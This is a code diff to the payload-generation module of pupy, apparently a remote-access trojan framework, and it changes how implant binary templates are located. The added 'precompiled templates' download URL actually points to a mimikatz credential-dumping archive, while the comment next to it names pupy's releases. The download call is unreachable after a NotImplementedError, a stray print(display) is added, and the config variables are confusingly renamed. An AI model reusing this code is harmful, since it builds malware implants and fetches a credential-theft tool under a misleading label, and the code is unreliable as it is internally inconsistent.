@@ -31,6 +31,7 @@ import errno
 
 from io import open, BytesIO
 
+from pupy.pupylib.utils.downloader import download
 from pupy.pupylib.utils.listener import get_listener_ip, get_listener_port
 from pupy.pupylib.utils.jarsigner import jarsigner
 from pupy.pupylib.payloads import dependencies
@@ -43,7 +44,7 @@ from pupy.pupylib.PupyCompile import pupycompile
 from pupy.pupylib.PupyConfig import PupyConfig
 from pupy.pupylib.PupyLogger import getLogger
 from pupy.pupylib.PupyOutput import (
-    Success, Warn, Error, List, Table, MultiPart, Color
+    Success, Warn, Error, List, Table, MultiPart, Color, Info
 )
 from pupy.network.conf import transports, launchers
 from pupy.network.lib.base_launcher import LauncherError
@@ -55,6 +56,8 @@ from pupy.pupylib.PupyCredentials import Credentials, EncryptionError
 
 logger = getLogger('gen')
 
+# "https://github.com/n1nj4sec/pupy/releases"
+PRECOMPILED_TEMPLATES_DOWNLOAD_URL ="https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.7z"
 HARDCODED_CONF_SIZE = 500000
 from pupy.pupylib import ROOT
 
@@ -473,7 +476,9 @@ def generate_ps1(
 
 
 def generate_binary_from_template(
-        display, config, target, shared=False, fmt=None):
+        display, conf, target, shared=False, fmt=None):
+
+    config = PupyConfig()
 
     TEMPLATE_FMT = fmt or 'pupy{arch}{debug}-{pyver}.{ext}'
 
@@ -524,21 +529,37 @@ def generate_binary_from_template(
         arch=arch, debug=debug_fmt, ext=ext,
         pyver=target.pyver_str
     )
-
+    
+    # search in project root first
     template = os.path.join(
-        'payload_templates', filename
+        ROOT, 'payload_templates', filename
     )
 
+    # finally search in user directory
     if not os.path.isfile(template):
-        template = os.path.join(
-            ROOT, 'payload_templates', filename
+        templatedir = os.path.join(
+            config.user_root, 'payload_templates'
         )
+        if not os.path.isdir(templatedir):
+            print(display)
+            display(Error("payload binary templates are not available."))
+            display(Info("You must compile them or download precompiled templates."))
+            res=input(f"Do you want to download precompiled templates from {PRECOMPILED_TEMPLATES_DOWNLOAD_URL} ? Y/n ")
+            if res.lower().strip()=="y" or res.lower().strip()=="yes" or res.lower().strip()=="":
+                dst=os.path.join(config.user_root, "payload_templates.txz")
+                raise NotImplementedError("TODO: download precompiled templates")
+                download(PRECOMPILED_TEMPLATES_DOWNLOAD_URL, dst)
+
+        template = os.path.join(
+            config.user_root, 'payload_templates', filename
+        )
+
 
     if not os.path.isfile(template):
         raise ValueError('Template not found ({})'.format(template))
 
     if target.debug:
-        config['debug'] = True
+        conf['debug'] = True
 
     config_table = [{
         'KEY': k,
@@ -549,7 +570,7 @@ def generate_binary_from_template(
             if type(v) not in (tuple, list, set)
             else ' '.join(unicode(x) for x in v)
         )
-    } for k, v in config.items() if v]
+    } for k, v in conf.items() if v]
 
     display(
         Table(
@@ -559,7 +580,7 @@ def generate_binary_from_template(
     )
 
     return generator(
-        target, display, template, config
+        target, display, template, conf
     ), filename, makex
 
 
